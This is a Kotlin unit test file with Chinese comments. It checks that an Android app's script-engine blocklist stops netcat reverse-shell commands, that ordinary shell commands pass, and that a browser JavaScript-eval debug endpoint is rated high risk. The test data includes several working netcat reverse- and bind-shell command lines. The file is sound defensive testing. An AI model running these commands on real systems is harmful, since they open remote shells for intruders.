package io.github.aixtin.nyral

import org.junit.Test

/**
 * R3-4 / R3-6 防回归测试(2026-10-04):
 * - R3-4: normalizeDanger 去短横线后 "nc -e" → "nce" 命中规范化黑名单; 原始层补充 nc 反向 Shell 构造面
 * - R3-6: /v1/browser/eval 挂门禁, "browser_eval" 必须被 riskOf 判为 HIGH(auto 档才会弹确认)
 * 全部纯逻辑/反射, 不触碰 Android API 与真实 Shell 执行。
 */
class SecurityR34R36Test {

    private fun block(script: String): String? {
        val m = ScriptEngine::class.java.getDeclaredMethod("blockReason", String::class.java)
        m.isAccessible = true
        return m.invoke(ScriptEngine, script) as String?
    }

    @Test
    fun ncReverseShellVariantsBlocked() {
        // R3-4 原文: 黑名单 "nce" 想拦 nc -e, 但 normalizeDanger 不去短横线("nc -e"→"nc-e")永不匹配
        val evil = listOf(
            "nc -e 10.0.0.1 4444",
            "nc -e /bin/sh",
            "nc -l -e /bin/sh",
            "nc -lvp 4444 -e /bin/bash",
            "nc -nlvp 4444 -e /bin/sh",
            "nc-e 10.0.0.1 4444",        // 无空格变体, 走规范化 nce
            "echo run; nc -e 10.0.0.1 4444"
        )
        for (s in evil) {
            val r = block(s)
            check(r != null) { "反向 Shell 应被拦截: $s" }
        }
    }

    @Test
    fun normalCommandsNotBlocked() {
        val ok = listOf(
            "echo hello",
            "ls -la /",
            "cat /etc/hostname",
            "curl -s https://example.com",
            "git status",
            "date +%Y%m%d"
        )
        for (s in ok) {
            val r = block(s)
            check(r == null) { "普通命令不应拦截: $s -> $r" }
        }
    }

    @Test
    fun browserEvalRankHigh() {
        // R3-6: DebugServer /v1/browser/eval 任意 JS 求值必须挂门禁 → auto 档无票时确认
        val r = SecurityConfig.riskOf("browser_eval")
        check(r == SecurityConfig.RiskLevel.HIGH) { "browser_eval 应判 HIGH, 实际 $r" }
        // needsConfirm 的 auto 档无票确认依赖真实 Context(dangerMode 读 SharedPreferences),
        // 此处以 riskOf==HIGH 锁定门禁前提(needsConfirm 对 HIGH 恒确认), 避免单元测试触碰 Android API。
    }
}
